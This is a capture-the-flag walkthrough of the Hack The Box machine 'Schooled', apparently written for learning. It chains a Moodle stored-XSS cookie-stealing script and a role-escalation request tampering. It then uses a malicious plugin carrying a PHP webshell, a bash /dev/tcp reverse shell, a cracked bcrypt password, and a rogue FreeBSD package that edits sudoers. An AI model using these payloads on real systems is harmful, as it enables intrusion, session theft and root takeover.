[HTB: Schooled](#)




![](/img/schooled-cover.png)

Schooled starts with a string of exploits to gain more and more
privilege in a Moodle instance, eventually leading to a malicious plugin
upload that provides a webshell. I'll pull some hashes from the DB and
crack them to get to the next user. This user can run the FreeBSD
package manager, pkg, as root, and can also write to the hosts file.
I'll trick it into connecting to my VM, and give it a malicious package
that provide root. In Beyond Root, I'll look at the Moodle plugin a bit
more in depth.

`nmap` found three open TCP ports, SSH (22), HTTP (80), and something

### schooled.htb - TCP 80

#### Site

The site is for a school:


[![](/img/image-20210401135637848.png)](/img/image-20210401135637848.png)


[*Click for full
![image*](/img/image-20210401135637848.png)



At the very bottom of the page, there's contact details and the footer
that container the DNS name, `schooled.htb`.

![](/img/image-20210401135823357.png)

![](/img/image-20210401135829512.png)

Visiting this domain gives the same page as visiting by IP address.

There's a link to a teachers page as well:

This will be useful later as I compromise their various accounts.

#### Directory Brute Force

Running [FeroxBuster](https://github.com/epi052/feroxbuster) against the
site returned a few directories, but nothing interesting:

I poked at the `prettyPhoto` path, but nothing jumped out.

### VHost Brute Force

Because the host is using at least one domain name, I'll check for
subdomains with `wfuzz`. Right away one jumps out:



    oxdf@parrot$ wfuzz -u http://10.10.10.234 -H "Host: FUZZ.schooled.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 20750

[Moodle](https://moodle.org/) is an onlyine course work platform, so it
definitely fits the box theme.

### moodle.schooled.htb - TCP 80

#### Site

This subdomain is in fact an instance of Moodle:

![](/img/image-20210401140807992.png)

Clicking around the site, each of the courses doesn't grant access, but
requires me to log in:

![](/img/image-20210401140951801.png)

#### Version / Vulnerabilities

I did some Googling and `searchsploit` for Moodle vulnerabilities, but
there was a bunch of stuff, and the interesting ones were at least a few
years old (like the one used in
[Teacher](/htb-teacher.md)). It would be helpful to know
the version of Moodle here. The [Moodle
GitHub](https://github.com/moodle/moodle) page shows files that might
provide a hint to the version. There's a `version.php` in the root of
the repo, and it exists on Schooled as well at `/moodle/version.php`,
but just returns a blank page. Still, now I can be oriented that
`/moodle` is the base of the git repo.

There's a list of dependencies at `/moodle/package.json`:

![](/img/image-20210401143254653.png)

And a `/moodle/npm-shrinkwrap.json`:

![](/img/image-20210401143345306.png)

At `/moodle/theme/upgrade.txt`, there's a changelog that gives the
current version, 3.9:

![](/img/image-20210401143607797.png)

Still not much to find at this point. There is a [Moodle Security
page](https://moodle.org/security/index.php). Scrolling through that
does show that they are constantly patching XSS vulnerabilities, as well
as SSRFs. I'll keep an eye out for those.

#### Registration

At the login page, there's a link to register:

![](/img/image-20210401141242899.png)

It won't accept any email that doesn't come from `student.schooled.htb`:

![](/img/image-20210401141353641.png)

I'll add this subdomain to `/etc/hosts`, but it just loads the same page
as the base domain.

When I update my email to 0xdf@student.schooled.htb, it accepts the
submission, and takes me to a link to confirm the account. I'd guess
this is typically where the link is emailed to the person registering,
but that doesn't work on HTB today.

![](/img/image-20210401141610678.png)

On clicking Continue, it says my registration is confirmed, and
redirects back to the page I was on, now logged in:

![](/img/image-20210401141646772.png)

#### Enroll

Of the four courses, three of them say that you can't enroll in this
course. For example, Scientific Research:

![](/img/image-20210401142213978.png)

On the other hand, Mathematics offers "self enrollment":

![](/img/image-20210401142242252.png)

On logging in and looking around, the Announcements section has a couple
of posts:

![](/img/image-20210401142335290.png)

The Reminder for joining students says that all students need to have a
MoodleNet profile:

![](/img/image-20210401142418761.png)

## Shell as www

### Moodle Access as Manuel

#### XXS POC

Any time I see a CTF machine suggest that someone will be checking
things, I wonder if that's a hint to some kind of automation, and in
this case, would fit with the XSS vulnerabilities I already noticed.
[This security
report](https://moodle.org/mod/forum/discuss.php?d=410839#p1657001),
MSA-20-0011: Stored XSS via moodlenetprofile parameter in user profile,
seems to pull all of this together (CVE-2020-25627).

On the profile page, there's a field for MoodleNet profile:

![](/img/image-20210401144331846.png)

To see if this will work, I'll create a simple payload that attempts to
load a script from my server:



    <script src="http://10.10.14.7/pwn.js"></script>



I'll start a Python HTTP server (`python3 -m http.server 80`), and
submit that as the MoodleNet profile. Almost instantly I get a hit back
form my own IP trying to fetch the script:



    10.10.14.7 - - [05/Apr/2021 14:47:18] code 404, message File not found
    10.10.14.7 - - [05/Apr/2021 14:47:18] "GET /pwn.js HTTP/1.1" 404 -
    10.10.14.7 - - [05/Apr/2021 14:47:18] code 404, message File not found
    10.10.14.7 - - [05/Apr/2021 14:47:18] "GET /pwn.js HTTP/1.1" 404 -



The script does not exist, so my webserver returns 404 (and it looks
like my browser tried a second time to fetch). That's a good sign. It
indicates that the `<script>` block was saved into the page, and if
someone else tries to look at it, they will also try to load my script.

Less than a minute later, there's another hit, from Schooled:



    10.10.10.234 - - [05/Apr/2021 14:48:01] code 404, message File not found
    10.10.10.234 - - [05/Apr/2021 14:48:01] "GET /pwn.js HTTP/1.1" 404 -
    10.10.10.234 - - [05/Apr/2021 14:50:05] code 404, message File not found
    10.10.10.234 - - [05/Apr/2021 14:50:05] "GET /pwn.js HTTP/1.1" 404 -



#### Steal Cookie

I'll write a quick JavaScript payload that will generate a GET request
back to me that includes the visiting user's cookie:



    var fetch_req = new XMLHttpRequest();
    fetch_req.open("GET", "http://10.10.14.7/?cookie=" + document.cookie, false);           
    fetch_req.send();



The next time Schooled requests the script, it immediately makes another
request with the cookie:



    10.10.10.234 - - [05/Apr/2021 14:52:09] "GET /pwn.js HTTP/1.1" 200 -
    10.10.10.234 - - [05/Apr/2021 14:52:09] "GET /?cookie=MoodleSession=1d5priq1upigf4u74ej6c9nfvn HTTP/1.1" 200 -



In the firefox dev tools, in the Storage section, I'll replace my
`MoodleSession` cookie with the one I just got:

![](/img/image-20210401145439543.png)

Now on visiting `http://moodle.schooled.htb/moodle`, I'm logged in as
Manuel Phillips:

![](/img/image-20210401145519020.png)

### Moodle Access as Lianne

#### Add Manual as Manager

From the initial page, Manuel is a Mathematics Lecturer. There's not too
much to find. There are no messages with information. No obvious places
to get RCE or upload anything that could execute.

I turned back to the Moodle Security page, and two issues before the
stored XSS, there's another one that's interesting, [Course enrolments
allowed privilege escalation from teacher role into manager
role](https://moodle.org/mod/forum/discuss.php?d=407393#p1644268)
(MSA-20-0009, CVE-2021-14321).

[This GitHub page](https://github.com/HoangKien1020/CVE-2020-14321) has
some sparse details on the exploit, including a link to a blog that is
no longer up, and [this video on Vimeo](https://vimeo.com/441698193)
showed the details of how to exploit it. I need to know someone who has
the manager role. Back on the teachers page, Lianne Carter was listed as
"Manager & English Lecturer", so I can try her.

I'll start by going to the Math class, and selecting Participants from
the menu on the left. On that page, I'll click the "Enrol users" button
to get a form:

![](/img/image-20210401151238759.png)

As I start to enter Lianne, it will autofill:

![](/img/image-20210401151313068.png)

I'll turn on intercept in Burp proxy, and click Enrol users. The
resulting GET request has a ton of parameters:



    GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid=10&sesskey=CIXNWKLP05&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0&userlist%5B%5D=25&roletoassign=5&startdate=4&duration=



I'll want to change the `userlist%5B%5D` number to Manuel's id (which I
can get from his profile page url to be 24), and change `roletoassign`
from 5 (presumably student) to 1 (manager). Then I'll forward the
request on to Schooled. When the table loads, I'll see Manuel is now has
the Manager roll:

![](/img/image-20210401151707932.png)

#### Fighting Resets

I can look around a bit more as a Manager, but there's nothing obvious
to try. However, the video above does continue to another step, which
includes having the manager (Lianne) in the class.

The other thing is that there's some kind of scheduled task that's
resetting the class list (Manual back to teacher and removing Lianna)
every minute it seems. So I'm going to want to keep this enrol request
in Repeater so I can easily send it again. In fact, I can use two tabs,
or just change between user ids 24 and 25, but I'll want to add both
Manuel and Lianne as manager each time.

#### Impresonation

With a manager role for Manuel and Lianne in the class, if I click on
Lianna, on her profile, there's a link to "Log in as":

![](/img/image-20210401170059238.png)

CLicking that gives me the view as if I'm Lianne:

![](/img/image-20210401170125333.png)

### Enable Full Permissions

As Lianne, I now have a new menu item at the very bottom on the
left-side menu:

![](/img/image-20210401174412019.png)

In that area, there is a Plugins section, but there's not much I can do
in the current state:

![](/img/image-20210401174457154.png)

In the video, it shows how I can change the manager roll so that I can
get access to install plugs.

In the Users menu, I'll select Define roles under Permissions:

![](/img/image-20210401174846523.png)

The resulting page shows the roles and what they can do. I'll click the
gear next to Manager:

![](/img/image-20210401174932321.png)

The next page has a ton of options:


[![](/img/image-20210403154001024.png)](/img/image-20210403154001024.png)


[*Click for full
![image*](/img/image-20210403154001024.png)



I'll ignore all of them, turn on Burp Intercept, and click Save changes
at the very bottom. The resulting POST request has a *ton* of
parameters:

![](/img/image-20210401175046114.png)

The
[GitHub](https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions)
has a POC to use as the body here. It's important to note that the
payload there starts with `&return=manage`, which is the second
parameter in the payload in Burp:

![](/img/image-20210401175153658.png)

It won't work if I don't include the `sesskey`, so I'll replace the rest
of the payload with the one from GitHub, leaving the `sesskey` intact,
and then Forward the request.

Back on the Plugins page there's more options:

![](/img/image-20210401175339054.png)

### RCE

A Moodle Plugin is a zip file with a certain structure of folders and
PHP files. There are different types of plugins that can be read about
[here](https://docs.moodle.org/dev/Plugin_types). This [FAQ
page](https://moodle.com/faq/how-do-i-create-a-moodle-plugin/) has a
link to the [How-to guide](https://docs.moodle.org/dev/Blocks). While I
could write my own, the GitHub POC I've been following has a
[link](https://github.com/HoangKien1020/Moodle_RCE/blob/master/rce.zip)
to `rce.zip` that provides a webshell (I'll look at it in Beyond Root).

I'll upload that via the administrator panel:

![](/img/image-20210401175829804.png)

The next page shows a bunch of OKs (and a couple warnings) and I can
click continue at the bottom:

![](/img/image-20210401175921082.png)

Now the webshell is available:



    oxdf@parrot$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
    uid=80(www) gid=80(www) groups=80(www)



It seems like the box is periodically cleaning up plugins as well.

### Shell

#### Initial

I'll use the webshell to get a reverse shell. Interesting, even though
the box is BSD, the Bash reverse shell works perfectly:



    oxdf@parrot$ curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'" http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php



At `nc`:



    oxdf@parrot$ nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.7] from (UNKNOWN) [10.10.10.234] 41068
    bash: cannot set terminal process group (1039): Can't assign requested address
    bash: no job control in this shell
    [www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ id
    uid=80(www) gid=80(www) groups=80(www)



For people used to Linux, it's worth noting that the web root isn't
`/var/www.md` as is typically seen there, but rather
`/usr/local/www/apache24/data`.

#### Upgrade

Python doesn't appear to be installed on the box:



    [www@Schooled /]$ which python
    [www@Schooled /]$ which python3



It took me a while to notice, but it is installed, just not on the
`$PATH`:



    [www@Schooled /]$ echo $PATH
    /sbin:/bin:/usr/sbin:/usr/bin
    [www@Schooled /]$ find / -name python3 2>/dev/null
    /usr/local/bin/python3
    /usr/local/share/bash-completion/completions/python3



From there, the standard shell upgrade trick works:



    [www@Schooled /]$ /usr/local/bin/python3 -c 'import pty;pty.spawn("bash")'
    [www@Schooled /]$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    oxdf@parrot$ stty raw -echo; fg
    nc -lnvp 443
                reset
    Erase set to backspace.
    [www@Schooled /]$ 



There's one issue, the backspace key now prints `^?` instead of deleting
back a character. [This
post](https://www.ias.edu/math/computing/faq/set-my-backspace-key)
showed how to fix it by entering `stty erase ^?` (where `^?` is entered
by hitting backspace).

## Shell as jamie

### Enumeration

#### Home Directories

There are two uses with home directories:



    [www@Schooled /home]$ ls
    jamie
    steve



www cannot access either.

#### www

Going back to what www can access, I'll look around in the web
application. There's a `config.php` in
`/usr/local/www/apache24/data/moodle` that contains the DB connection
information:



    [www@Schooled /usr/local/www/apache24/data/moodle]$ cat config.php 
    <?php  // Moodle configuration file

    unset($CFG);
    global $CFG;
    $CFG = new stdClass();

    $CFG->dbtype    = 'mysqli';
    $CFG->dblibrary = 'native';
    $CFG->dbhost    = 'localhost';
    $CFG->dbname    = 'moodle';
    $CFG->dbuser    = 'moodle';
    $CFG->dbpass    = 'PlaybookMaster2020';
    $CFG->prefix    = 'mdl_';
    $CFG->dboptions = array (
      'dbpersist' => 0,
      'dbport' => 3306,
      'dbsocket' => '',
      'dbcollation' => 'utf8_unicode_ci',
    );

    $CFG->wwwroot   = 'http://moodle.schooled.htb/moodle';
    $CFG->dataroot  = '/usr/local/www/apache24/moodledata';
    $CFG->admin     = 'admin';

    $CFG->directorypermissions = 0777;

    require_once(__DIR__ . '/lib/setup.php');

    // There is no php closing tag in this file,
    // it is intentional because it prevents trailing whitespace problems!



I tried to `su` to both users with the password "PlaybookMaster2020"
without success.

#### Database

`mysql` is not in the path but installed. I'll connect using the creds
from above:



    [www@Schooled /]$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
    mysql: [Warning] Using a password on the command line interface can be insecure.
    Welcome to the MySQL monitor.  Commands end with ; or \g.

    moodle@localhost [moodle]>



Moodle creates a lot of tables, but I'm interesting in any that might
contain passwords, like `mdl_user`. The table has a ton of columns, but
I really just want username, email, and password:



    moodle@localhost [moodle]> select username, email, password from mdl_user;
    +-------------------+----------------------------------------+--------------------------------------------------------------+
    | username          | email                                  | password                                                     |

### Crack Hashes

Hashcat example hashes show these are bcrypt. Because cracking bcrypt
hashes is so slow, and because each word has to be tested for each
unique salt, I'm going to just test the admin account that has an email
address of jamie@staff.schooled.htb. The [Hashcat example
hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page shows
these are mode 3200, so I'll run
`hashcat -m 3200 --user hash /usr/share/wordlists/rockyou.txt`. It
cracks in a bout 15 minutes on a really low-powered VM:



    $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx



### SSH

The creds work to SSH in as jamie:



    oxdf@parrot$ sshpass -p '!QAZ2wsx' ssh jamie@10.10.10.234
    ...[snip]...
    jamie@Schooled:~ $



And gives access to `user.txt`:



    jamie@Schooled:~ $ cat user.txt
    997d334f************************



## Shell as root

### Enumeration

`sudo -l` shows that jamie can run two commands as root:



    jamie@Schooled:~ $ sudo -l
    User jamie may run the following commands on Schooled:
        (ALL) NOPASSWD: /usr/sbin/pkg update
        (ALL) NOPASSWD: /usr/sbin/pkg install *



### Takeover Update Server

Starting with the [man page for
pkg](https://www.freebsd.org/cgi/man.cgi?query=pkg&sektion=&n=1), `pkg`
has a ton of subcommands. jamie can only run two, `update` and
`install`:

> <div>
>
> <div>
>
>     install
>          Install a package from a remote package repository.  If a package
>          is found in more than one remote repository, then installation
>          happens from the first one.  Downloading a package is tried from
>          each package repository in turn, until the package is success-
>          fully fetched.
>          
>     update  Update the      available remote repositories as listed in
>              pkg.conf(5).
>
> </div>
>
> </div>

My first hope was that I could use the `pkg` command to install from a
file like `dpkg` on Debian-based OSes, but both of these commands have
to do with remote repositories, which makes that less likely.

The [man page for
pkg.conf](https://www.freebsd.org/cgi/man.cgi?query=pkg.conf&sektion=5&apropos=0&manpath=FreeBSD+12.2-RELEASE+and+Ports)
gives the location of that file, `/usr/local/etc/pkg.conf`. Looking at
it, most of the lines start with `#`, indicating they are commented out.
That's typically used to show the default settings. This looks like it
gives the directories where the remote repos are defined:



    #REPOS_DIR [
    #    "/etc/pkg/",
    #    "/usr/local/etc/pkg/repos/",
    #]



If I can write to either of these, I could add my own repo.
Unfortunately, jamie can't:



    jamie@Schooled:~ $ touch test /etc/pkg/0xdf
    touch: /etc/pkg/0xdf: Permission denied
    jamie@Schooled:~ $ touch test /usr/local/etc/pkg/repos/0xdf
    touch: /usr/local/etc/pkg/repos/0xdf: No such file or directory



The second one doesn't exist. But there is a single repository defined
in the first one:



    jamie@Schooled:~ $ ls -l /etc/pkg/
    total 5
    -rw-r--r--  1 root  wheel  421 Mar  1 11:06 FreeBSD.conf

    jamie@Schooled:~ $ cat /etc/pkg/FreeBSD.conf 
    # $FreeBSD$
    #
    # To disable this repository, instead of modifying or removing this file,
    # create a /usr/local/etc/pkg/repos/FreeBSD.conf file:
    #
    #   mkdir -p /usr/local/etc/pkg/repos
    #   echo "FreeBSD: { enabled: no }" > /usr/local/etc/pkg/repos/FreeBSD.conf
    #

    FreeBSD: {
      url: "pkg+http://devops.htb:80/packages",
      mirror_type: "srv",
      signature_type: "none",
      fingerprints: "/usr/share/keys/pkg",
      enabled: yes
    }



Only root can edit this file. So that rules out my changing it to point
to my host as the server.

At this point, I know that jamie can run commands as root that will
reach out to devops.htb and get updates. Interestingly, if I try to ping
devops.htb, it resolves (though no pings succeed):



    jamie@Schooled:~ $ ping -c2 devops.htb
    PING devops.htb (192.168.1.14): 56 data bytes

    --- devops.htb ping statistics ---
    2 packets transmitted, 0 packets received, 100.0% packet loss



It resolved to 192.168.1.14 because it's defined in the `/etc/hosts`
file.



    jamie@Schooled:~ $ grep -v "^#" /etc/hosts
    ::1                     localhost localhost.my.domain
    127.0.0.1               localhost localhost.my.domain Schooled schooled.htb moodle.schooled.htb
    192.168.1.14            devops.htb



More interesting, members of the wheel group can edit `/etc/hosts`, and
jamie is in the wheel group:



    jamie@Schooled:~ $ ls -l /etc/hosts
    -rw-rw-r--  1 root  wheel  1098 Mar 17 15:47 /etc/hosts
    jamie@Schooled:~ $ id
    uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)



I'll update the IP to by mine, and run the `update` command with an HTTP
server listening on my VM:



    jamie@Schooled:~ $ sudo pkg update
    Updating FreeBSD repository catalogue...
    pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
    pkg: http://devops.htb/packages/meta.txz: Not Found
    repository FreeBSD has no meta file, using default settings
    pkg: http://devops.htb/packages/packagesite.txz: Not Found
    Unable to update repository FreeBSD
    Error updating repositories!



The server sees three requests (all 404):



    oxdf@parrot$ python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.234 - - [06/Apr/2021 08:18:57] code 404, message File not found
    10.10.10.234 - - [06/Apr/2021 08:18:57] "GET /packages/meta.conf HTTP/1.1" 404 -
    10.10.10.234 - - [06/Apr/2021 08:18:57] code 404, message File not found
    10.10.10.234 - - [06/Apr/2021 08:18:57] "GET /packages/meta.txz HTTP/1.1" 404 -
    10.10.10.234 - - [06/Apr/2021 08:18:58] code 404, message File not found
    10.10.10.234 - - [06/Apr/2021 08:18:58] "GET /packages/packagesite.txz HTTP/1.1" 404 -



Similarly, the `install` command will contact me as well, requesting the
same three files:



    jamie@Schooled:~ $ sudo pkg install pwned
    Updating FreeBSD repository catalogue...
    pkg: http://devops.htb/packages/meta.txz: Not Found
    repository FreeBSD has no meta file, using default settings
    pkg: http://devops.htb/packages/packagesite.txz: Not Found
    Unable to update repository FreeBSD
    Error updating repositories!



These files tell the client (Schooled) about the packages that the
server is hosting, versions, etc.

### Generate Package

#### Overview

Now that I can make Schooled contact my VM requesting updates /
packages, I will make a malicious package that will enable root access.
There's an entire chapter [in the FreeBSD
docs](https://docs.freebsd.org/en_US.ISO8859-1/books/porters-handbook/own-port.md)
about making a new Port (what FreeBSD calls a package). [This
post](http://lastsummer.de/creating-custom-packages-on-freebsd/) gives a
simpler path to creating a package. In a staging directory, I'm going to
create a few files:

-   `+POST_INSTALL` - This is the file that will run on install.
-   `+MANIFEST` - Metadata about the package.
-   `usr/local/etc/my.conf` - This is a fake conf file that will be
    dropped into place on the installing system.
-   `plist` - Information about that conf file.

Then I need to run some `pkg` commands to create the package and the
repo files. `pkg create` (doesn't need to be run as root) will create a
package archive file. `pkg repo` will:

> <div>
>
> <div>
>
>     Create a local package repository for remote usage.
>
> </div>
>
> </div>

In practice this creates the metadata files that Schooled was requesting
when it ran `pkg update` and `pkg install`.

Because I need access to `pkg`, I could create a FreeBSD VM, or I could
just work from a staging directory on Schoool. I'll do the latter.

#### Generate Package

I'll create a staging directory to work from:



    jamie@Schooled:/var/tmp $ mkdir .0xdf



I tried a couple ways to get a shell as root, but the one that
ultimately ended up working was to write to the `sudoers` file:



    jamie@Schooled:/var/tmp/.0xdf $ cat > +POST_INSTALL <<EOF
    > echo "jamie ALL=(ALL) NOPASSWD: ALL" >> /usr/local/etc/sudoers
    > EOF



Next the manifest file, using the template from the blog post (many of
these fields are probably not necessary):



    jamie@Schooled:/var/tmp/.0xdf $ cat > +MANIFEST <<EOF
    name: "0xdf"
    version: "1.0_5"
    origin: sysutils/0xdf
    comment: "0xdf was here"
    desc: "moar root plz"
    maintainer: 0xdf@schooled.htb
    www: https://0xdf.gitlab.io
    prefix: /
    EOF



Create the config file and `plist`:



    jamie@Schooled:/var/tmp/.0xdf $ mkdir -p usr/local/etc
    jamie@Schooled:/var/tmp/.0xdf $ echo "# nothing to see here" > usr/local/etc/0xdf.conf
    jamie@Schooled:/var/tmp/.0xdf $ echo "/usr/local/etc/0xdf.conf" > plist



Now I'll create the package with `pkg create` which generates
`0xdf-root-1.0_5.txz`:



    jamie@Schooled:/var/tmp/.0xdf $ pkg create -m /var/tmp/.0xdf/ -r /var/tmp/.0xdf/ -p /var/tmp/.0xdf/plist -o .
    jamie@Schooled:/var/tmp/.0xdf $ ls
    +MANIFEST       +POST_INSTALL   0xdf-1.0_5.txz  plist           usr



#### Generate Repo Metadata

`pkg repo` will generate the repo metadata files:



    jamie@Schooled:/var/tmp/.0xdf $ pkg repo .
    Creating repository in .: 100%
    Packing files for repository: 100%
    jamie@Schooled:/var/tmp/.0xdf $ ls
    +MANIFEST       +POST_INSTALL   0xdf-1.0_5.txz  meta.conf       meta.txz        packagesite.txz plist           usr



### Host Package

I'm going to have Schooled update from my VM, so I need to get these
files back to my host, and put them into `/packages` on a webserver.
I'll use `scp`:



    oxdf@parrot$ sshpass -p '!QAZ2wsx' scp jamie@10.10.10.234:/var/tmp/.0xdf/packagesite.txz packages
    oxdf@parrot$ sshpass -p '!QAZ2wsx' scp jamie@10.10.10.234:/var/tmp/.0xdf/meta.* packages
    oxdf@parrot$ sshpass -p '!QAZ2wsx' scp jamie@10.10.10.234:/var/tmp/.0xdf/0xdf-1.0_5.txz packages
    oxdf@parrot$ find packages/
    packages/
    packages/meta.txz
    packages/packagesite.txz
    packages/meta.conf
    packages/0xdf-1.0_5.txz



In that directory, `python3 -m http.server 80` will host the files.

### Exploit

I'll re-update `/etc/hosts` with my IP (there's a cron resetting it
frequently), and run `pkg update`:



    jamie@Schooled:/var/tmp/.0xdf-staging $ sudo pkg update
    Updating FreeBSD repository catalogue...
    Fetching meta.conf: 100%    163 B   0.2kB/s    00:01    
    Fetching packagesite.txz: 100%    460 B   0.5kB/s    00:01    
    Processing entries: 100%
    FreeBSD repository update completed. 1 packages processed.
    All repositories are up to date.



The requests at my server look good:



    oxdf@parrot$ python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.234 - - [06/Apr/2021 09:03:28] "GET /packages/meta.conf HTTP/1.1" 200 -
    10.10.10.234 - - [06/Apr/2021 09:03:28] "GET /packages/packagesite.txz HTTP/1.1" 200 -



Next I'll install my package:



    jamie@Schooled:/var/tmp/.0xdf $ sudo pkg install 0xdf 
    Updating FreeBSD repository catalogue...
    Fetching meta.conf: 100%    163 B   0.2kB/s    00:01    
    FreeBSD repository is up to date.
    All repositories are up to date.
    The following 1 package(s) will be affected (of 0 checked):

    New packages to be INSTALLED:
            0xdf: 1.0_5

    Number of packages to be installed: 1

    572 B to be downloaded.

    Proceed with this action? [y/N]: Y
    [1/1] Fetching 0xdf-1.0_5.txz: 100%    572 B   0.6kB/s    00:01    
    Checking integrity... done (0 conflicting)
    [1/1] Installing 0xdf-1.0_5...
    [1/1] Extracting 0xdf-1.0_5: 100%



All looks good there. At the webserver, it requests `meta.conf` and
`packagesite.txz` (both of which return 304 Not Modified), and then the
package:



    10.10.10.234 - - [06/Apr/2021 09:04:49] "GET /packages/meta.conf HTTP/1.1" 304 -
    10.10.10.234 - - [06/Apr/2021 09:04:49] "GET /packages/packagesite.txz HTTP/1.1" 304 -
    10.10.10.234 - - [06/Apr/2021 09:04:54] "GET /packages/0xdf-1.0_5.txz HTTP/1.1" 200 -



### Shell

More importantly, it worked:



    jamie@Schooled:/var/tmp/.0xdf $ sudo -l
    User jamie may run the following commands on Schooled:
        (ALL) NOPASSWD: /usr/sbin/pkg update
        (ALL) NOPASSWD: /usr/sbin/pkg install *
        (ALL) NOPASSWD: ALL



`sudo su` will provide a root shell:



    jamie@Schooled:~ $ sudo su
    root@Schooled:/usr/home/jamie #



And `root.txt`:



    root@Schooled:~ # cat root.txt
    e65bc368************************



### Alternative GTFOBins

When Schooled released, I don't believe `pkg` was on GTFOBins, but it is
[now](https://gtfobins.github.io/gtfobins/pkg/). It uses `fpm` to
generate a dummy package. [fpm](https://github.com/jordansissel/fpm) is
a tool for building packages for various OSes. That binary isn't on
Schooled:



    jamie@Schooled:/tmp $ which fpm
    jamie@Schooled:/tmp $ find / -name fpm -type f 2>/dev/null



I'll install it on my VM with `sudo gem i fpm -f`, and build that
package there with the commands from GTFOBins, which results in a `txz`
file in the current directory:



    oxdf@parrot$ TF=$(mktemp -d)
    oxdf@parrot$ echo 'id' > $TF/x.sh
    oxdf@parrot$ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
    Created package {:path=>"x-1.0.txz"}
    oxdf@parrot$ file x-1.0.txz
    x-1.0.txz: XZ compressed data



I'll use `scp` to upload that to Schooled:



    oxdf@parrot$ sshpass -p '!QAZ2wsx' scp x-1.0.txz jamie@10.10.10.234:/tmp/



And from Schooled run the command given:



    jamie@Schooled:/tmp $ sudo pkg install -y --no-repo-update ./x-1.0.txz 
    pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
    pkg: Repository FreeBSD cannot be opened. 'pkg update' required
    Checking integrity... done (0 conflicting)
    The following 1 package(s) will be affected (of 0 checked):

    New packages to be INSTALLED:                               
            x: 1.0                                              

    Number of packages to be installed: 1       
    [1/1] Installing x-1.0...
    uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
    Extracting x-1.0:   0%
    pkg: File //tmp/tmp.E9AA2kxeLQ/x.sh not specified in the manifest
    Extracting x-1.0: 100% 



There's a bunch in there, but four lines from the bottom is the output
of `id` showing root. From there I can get a shell any number of ways.

## Beyond Root

I used a malicious Moodle plugin to get execution on Schooled. Rather
than make one, I downloaded one from [this
GitHub](https://github.com/HoangKien1020/Moodle_RCE). I uploaded the
plugin, and then triggered the webshell at:



    http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id



So what is it?

The file is `rce.zip`, and it is a zip archive that contains two files
with some directories:



    oxdf@parrot$ file rce.zip 
    rce.zip: Zip archive data, at least v1.0 to extract
    oxdf@parrot$ unzip -l rce.zip 
    Archive:  rce.zip
      Length      Date    Time    Name
    ---------  ---------- -----   ----
            0  2020-06-17 11:23   rce/
            0  2020-06-17 09:52   rce/lang/
            0  2020-06-17 13:43   rce/lang/en/
           30  2020-06-17 11:31   rce/lang/en/block_rce.php
           73  2020-06-17 13:43   rce/version.php
    ---------                     -------
          103                     5 files



`version.php` gives some metadata about the "plugin":



    <?php 
    $plugin->version = 2020061700;
    $plugin->component = 'block_rce';



`block_rce.php` is a simple webshell:



    <?php system($_GET['cmd']); ?>



Moodle must unpack the plugin into the `/blocks/` directory, where I can
then access it.
